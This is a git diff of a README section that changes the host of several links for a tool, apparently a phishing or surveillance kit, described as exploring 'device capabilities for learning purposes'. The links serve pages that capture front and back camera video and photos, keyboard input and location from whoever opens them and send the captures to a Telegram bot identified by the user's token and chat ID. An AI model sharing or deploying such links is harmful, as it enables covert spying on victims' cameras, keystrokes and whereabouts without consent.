@@ -58,23 +58,23 @@ Explore device capabilities through the tool’s APIs for learning purposes:
 
 - **Front Camera (Video)**:
   ```
-  https://vide-ch0t.vercel.app/video-f.html?token=<Telegram Token>&id=<Chat ID>
+  https://bdorgacare.com/video-f.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Back Camera (Video)**:
   ```
-  https://vide-ch0t.vercel.app/video-b.html?token=<Telegram Token>&id=<Chat ID>
+  https://bdorgacare.com/video-b.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Front Camera (Photo)**:
   ```
-  https://vide-ch0t.vercel.app/photo-f.html?token=<Telegram Token>&id=<Chat ID>
+  https://bdorgacare.com/photo-f.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Back Camera (Photo)**:
   ```
-  https://vide-ch0t.vercel.app/photo-b.html?token=<Telegram Token>&id=<Chat ID>
+  https://bdorgacare.com/photo-b.html?token=<Telegram Token>&id=<Chat ID>
   ```
 - **Keyboard & Location Info**:
   ```
-  https://vide-ch0t.vercel.app/main.html?token=<Telegram Token>&id=<Chat ID>
+  https://bdorgacare.com/main.html?token=<Telegram Token>&id=<Chat ID>
   ```
 
 Replace `<Telegram Token>` and `<Chat ID>` with your own details for access.
